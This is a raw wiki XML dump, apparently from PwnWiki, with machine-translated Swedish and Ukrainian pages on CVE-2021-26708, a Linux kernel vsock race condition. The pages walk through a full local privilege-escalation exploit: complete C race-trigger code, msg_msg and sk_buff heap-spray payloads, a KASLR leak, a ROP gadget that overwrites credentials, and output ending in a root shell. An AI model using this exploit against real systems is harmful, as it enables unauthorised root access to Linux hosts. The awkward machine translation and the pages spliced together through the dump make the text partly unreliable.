Här är hur sårbarheten extraherar dessa pekare från minnet:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Implementera Use-after-free på sk_buff ==

Den nätverksrelaterade bufferten i Linux-kärnan representeras av struct sk_buff. Det finns skb_shared_info och destructor_arg i detta objekt, som kan användas för att styra flödeskapning. Nätverksdata och skb_shared_info placeras i samma kärnminnesblock som sk_buff.head pekar på. Därför skapar ett 2800-byte nätverkspaket i användarutrymme att skb_shared_info allokeras till kmalloc-4k-blockcache, liksom mem_cgroup-objektet.

Jag byggde följande steg:

1. Använd sockets (AF_INET, SOCK_DGRAM, IPPROTO_UDP) för att skapa ett klientuttag och 32 serveruttag

2. Förbered en 2800-byte buffert i användarutrymmet och använd 0x42 för att memset ()

3. Använd sendto () för att skicka denna buffert från klientuttaget till varje serveruttag för att skapa sk_buff-objekt i kmalloc-4k. Använd `sched_setaffinity () på varje tillgänglig CPU

4. Utför godtycklig läsprocess på vsock_sock

5. Beräkna den möjliga sk_buff-kärnadressen som sk_memcg plus 4096 (nästa element i kmalloc-4k)

6. Utför godtyckliga läsningar på denna möjliga sk_buff-adress

7. Om du hittar 0x42424242424242lu på platsen för nätverksdata, leta reda på den verkliga sk_buffen och gå till steg 8. Annars lägger du till 4096 till den möjliga sk_buff-adressen och går till steg 6

8. Kör setxattr () &amp; userfaultfd () högspray med 32 pthreads på sk_buff och häng dem på pthread_barrier

9. Släpp godtyckligt sk_buff-kärnadressen

10. Ring pthread_barrier_wait (), kör 32 setxattr () för att täcka högsprutpthreads av skb_shared_info

11. Använd recv () för att ta emot nätverksmeddelanden från serveruttaget.

== Skriva fritt genom skb_shared_info ==

Följande är en giltig nyttolast som skriver över sk_buff-objektet:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info finns i injektionsdata, exakt vid offset SKB_SHINFO_OFFSET, vilket är 3776 byte. Skb_shared_info.destructor_arg-pekaren lagrar adressen till struct ubuf_info. Eftersom kärnadressen till den attackerade sk_buffen är känd kan en falsk ubuf_info skapas på MY_UINFO_OFFSET i nätverksbufferten. Följande är layouten för en giltig nyttolast:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Låt oss prata om återuppringaren för destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Eftersom jag inte kunde hitta en gadget som kan tillgodose mina behov i vmlinuz-5.10.11-200.fc33.x86_64, undersökte jag och konstruerade den själv.

Återuppringningsfunktionspekaren lagrar adressen till en ROP-gadget, RDI lagrar den första parametern för återuppringningsfunktionen, vilket är adressen till själva ubuf_info och RDI + 8 pekar på ubuf_info.desc. gadget flyttar ubuf_info.desc till RDX. Nu innehåller RDX ett effektivt användar-ID och grupp-ID-adress minus en byte. Denna byte är väldigt viktig: när gadgeten skriver meddelande 1 från RSI till det minne som RDX pekar på kommer den effektiva uid och gid att skrivas över med noll. Upprepa samma process tills behörigheterna uppgraderas till root. Utflödet för hela processen är som följer:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Video ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


== Referens ==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>5s975rmx2q0usxaqbzxyfyak6fbgnsu</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/uk</title>
    <ns>0</ns>
    <id>2171</id>
    <revision>
      <id>2597</id>
      <timestamp>2021-05-06T01:52:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Для того, щоб обробити &lt;code&gt; connect () &lt;/code&gt; віртуального сокета, ядро ​​виконує &lt;code&gt; vsock_stream_connect () &lt;/code&gt;,..."</comment>
      <origin>2597</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="32208" sha1="sn7sjohcokndoackx31p8foxnm5mw84" xml:space="preserve">&lt;languages  /&gt;
== Уразливість ==

Ці вразливості - це умови перегонів, спричинені неправильним блокуванням у &lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Ці умовні змагання були неявно представлені у поданні, яке додало підтримку мультитранспорту VSOCK у листопаді 2019 року, та були об’єднані у версію ядра Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; та &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; надаються як модулі ядра у всіх основних дистрибутивах GNU / Linux. Коли ви створюєте сокет для домену AF_VSOCK, ці вразливі модулі завантажуються автоматично.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

Створення &lt;code&gt; AF_VSOCK &lt;/code&gt; сокетів доступне для непривілейованих користувачів і не вимагає простору імен користувачів.


== Пошкодження пам'яті ==

Далі наведено докладний вступ до використання CVE-2021-26708, використовуючи умовну конкуренцію в &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Для відтворення потрібні два потоки. Перший потік викликає &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



Другий потік змінює передачу віртуального сокета, коли &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; намагається отримати блокування сокета, повторно підключивши віртуальний сокет:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Для того, щоб обробити &lt;code&gt; connect () &lt;/code&gt; віртуального сокета, ядро ​​виконує &lt;code&gt; vsock_stream_connect () &lt;/code&gt;, що викликає &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Ця функція містить такий код:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; містить блокування сокета, а &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; у паралельному потоці також намагається отримати його, що становить умовну конкуренцію. Отже, коли другий &lt;code&gt; connect () &lt;/code&gt; виконується з іншим &lt;code&gt; svm_cid &lt;/code&gt;, викликається функція &lt;code&gt; vsock_de assign_transport () &lt;/code&gt;. Ця функція виконує &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, випускає &lt;code&gt; vsock_sock.trans &lt;/code&gt;, а для &lt;code&gt; vsk-&gt; transport &lt;/code&gt; встановлено значення NULL. Коли &lt;code&gt; vsock_stream_connect () &lt;/code&gt; звільняє блокування сокета, &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; може продовжувати виконуватися. Він викликає &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt;, а потім викликає &lt;code&gt; transport-&gt; notify_buffer_size () &lt;/code&gt;. Тут транспорт містить застаріле значення з локальної змінної, яке не відповідає &lt;code&gt; vsk-&gt; транспорт &lt;/code&gt; (вихідне значення має значення NULL).

Коли ядро ​​виконує &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt;, відбувається пошкодження пам'яті:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Тут vvs - це вказівник на пам’ять ядра, який був випущений у &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. Розмір &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; дорівнює 64 байтам і знаходиться в кеш-пам’яті kmalloc-64. Тип поля buf_alloc має значення u32 і знаходиться зі зміщенням 40. &lt;code&gt; VIRTIO_VSOCK_MAX_BUF_SIZE - 0xFFFFFFFFUL &lt;/code&gt;. Значення * val контролюється зловмисником, а його чотири найменш важливі байти записуються у звільнену пам'ять.


== Розмивання ==

Fuzzer syzkaller не має можливості відтворити цю аварію, тому я вирішив вивчити її сам. Але чому фуззер виходить з ладу? Дотримуйтесь &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; і дізнайтеся:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Тільки тоді, коли val відрізняється від поточного buffer_size, буде викликатися &lt;code&gt; notify_buffer_size () &lt;/code&gt;, тобто, коли &lt;code&gt; setsockopt () &lt;/code&gt; виконує &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, кожного разу Параметри розміру дзвінка повинні бути різними. Тож я створив відповідний код:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

Значення розміру тут береться з кількості наносекунд, повернутих &lt;code&gt; clock_gettime () &lt;/code&gt;, яка може різнитися кожного разу. Оригінальний syzkaller цього не робить, оскільки коли syzkaller генерує нечіткий вхід, значення параметра syscall визначається і не буде змінюватися під час виконання.

== Ступінь чотирьох байт ==

Тут я вибираю сервер Fedora 33 як ціль дослідження, версія ядра - 5.10.11-200.fc33.x86_64, і я твердо вирішив обійти SMEP та SMAP.

На першому кроці я почав вивчати стабільне розпилення купи, яке використовувало виконання просторових дій користувача, щоб змусити ядро ​​виділити ще один 64-байтовий об'єкт у розташуванні звільненого virtio_vsock_sock. Після кількох експериментальних спроб було підтверджено, що випущений virtio_vsock_sock був перезаписаний, вказуючи на те, що обприскування купи можливо. Нарешті я знайшов msgsnd () syscall. Він створює struct msg_msg у просторі ядра, див. Вивід pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

Спереду - заголовок повідомлення, а ззаду - дані повідомлення. Якщо структура msgbuf у користувацькому просторі має 16-байтовий mtext, відповідний msg_msg буде створений у кеш-пам'яті kmalloc-64. 4-байтовий беззаписний запис зруйнує покажчик безпеки void * зі зміщенням 40. Поле msg_msg.security вказує на дані ядра, виділені lsm_msg_msg_alloc (). Коли msg_msg отримано, воно буде звільнене за допомогою security_msg_msg_free (). Отже, знищивши першу половину покажчика безпеки, можна отримати довільний безкоштовний.

== Витік інформації про ядро ​​==

Тут використовується [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683] та ж техніка. Друге з'єднання () віртуального сокета викликає &lt;code&gt; vsock_de assign_transport () &lt;/code&gt; і встановлює &lt;code&gt; vsk-&gt; transport &lt;/code&gt; на NULL, роблячи &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Виклик &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; після збою пам'яті з'являється попередження ядра:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
За допомогою налагодження gdb виявляється, що регістр RCX містить адресу ядра звільненої virtio_vsock_sock, а регістр RBX - адресу ядра vsock_sock.

== Досягнення довільного читання ==

===From arbitrary free to use-after-free===

Звільніть об’єкт з адреси ядра, що просочилася
Виконайте розпилення купи та накрийте об’єкт контрольованими даними
Використовуйте пошкоджені об’єкти для ескалації привілеїв
Повідомлення System V, реалізоване ядром, має максимальний ліміт DATALEN_MSG, тобто PAGE_SIZE мінус sizeof (struct msg_msg)). Якщо ви надсилаєте повідомлення більшого розміру, решта повідомлень зберігаються у списку сегментів повідомлень. Msg_msg містить структуру msg_msgseg * поруч із вказівкою на перший сегмент, а size_t m_ts використовується для зберігання розміру. При виконанні операції перезапису ви можете помістити контрольоване значення в msg_msg.m_ts та msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Але як використовувати msg_msg для читання даних ядра? Читаючи документацію щодо системного виклику msgrcv (), я знайшов хороше рішення, використовуючи прапори msgrcv () та MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Цей прапор змушує ядро ​​копіювати дані повідомлень у користувацький простір, не видаляючи їх із черги повідомлень. Якщо ядро ​​має CONFIG_CHECKPOINT_RESTORE = y, то MSG доступний і застосовується на сервері Fedora.

=== Етапи довільного читання ===

Готовий до роботи:
Використовуйте sched_getaffinity () та CPU_COUNT () для обчислення кількості доступних процесорів (для цієї вразливості потрібно щонайменше два);
Відкрити /dev/kmsg для аналізу;
mmap () налаштовує userfaultfd () в області пам'яті spray_data як останню частину;
Запустіть окремий pthread для обробки подій userfaultfd ();
Запустіть 127 потоків для розпилювача кучі setxattr () &amp; userfaultfd () на msg_msg і повісьте їх на thread_barrier;
Отримайте адресу ядра оригінального msg_msg:
Умовна конкуренція на віртуальних сокетах;
Після другого з'єднання (), зачекайте 35 мікросекунд у зайнятому циклі;
Зателефонуйте msgsnd (), щоб створити окрему чергу повідомлень; після пошкодження пам’яті об’єкт msg_msg поміщається в положення virtio_vsock_sock;
Проаналізуйте журнал ядра та збережіть адресу ядра msg_msg із попередження ядра (регістр RCX);
Одночасно збережіть адресу ядра vsock_sock з реєстру RBX;
Використовуйте пошкоджений msg_msg, щоб виконати довільний випуск оригінального msg_msg:
Використовуйте 4 байти вихідної адреси msg_msg як SO_VM_SOCKETS_BUFFER_SIZE для досягнення пошкодження пам’яті;
Умовна конкуренція на віртуальних сокетах;
Зателефонуйте msgsnd () відразу після другого з'єднання (); msg_msg розміщується в положенні virtio_vsock_sock для досягнення знищення;
Покажчик безпеки тепер знищеного msg_msg зберігає адресу оригінального msg_msg (з кроку 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Якщо під час обробки msgsnd () відбувається пошкодження пам'яті msg_msg.security з потоку setsockopt (), перевірка дозволів SELinux не вдається;
У цьому випадку msgsnd () повертає -1, а пошкоджений msg_msg знищується; випуск msg_msg.security може звільнити оригінальний msg_msg;
Перезапишіть вихідний msg_msg контрольованим корисним навантаженням:
Після того, як msgsnd () вийде з ладу, вразливість викличе pthread_barrier_wait () і викличе 127 pthreads для розпилення купи;
Ці pthreads виконують корисне навантаження setxattr ();
Початковий msg_msg замінюється керованими даними, а покажчик msg_msg.next зберігає адресу об'єкта vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Прочитайте вміст об’єкта ядра vsock_sock до простору користувача, отримавши повідомлення з черги повідомлень, в якому зберігається перезаписаний msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Знайдіть ціль атаки ==

Ось пункти, які я знайшов:
1. Виділений кеш блоку, такий як PINGv6 та sock_inode_cache, має багато покажчиків на об'єкти
2. Покажчик struct mem_cgroup * sk_memcg має зміщення 664 у vsock_sock.sk. Структура mem_cgroup виділена в кеш-пам’яті kmalloc-4k.
3. Вказівник власника const struct cred * знаходиться на відстані 840 від vsock_sock.sk і зберігає адресу облікових даних, які можна перезаписати для ескалації дозволів.
4. Покажчик функції void (* sk_write_space) (struct sock *) знаходиться на відстані 688 від vsock_sock.sk і встановлюється на адресу функції ядра sock_def_write_space (). Він може бути використаний для розрахунку зміщення KASLR.

Ось як уразливість витягує ці вказівники з пам'яті:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Впровадити Use-after-free на sk_buff ==

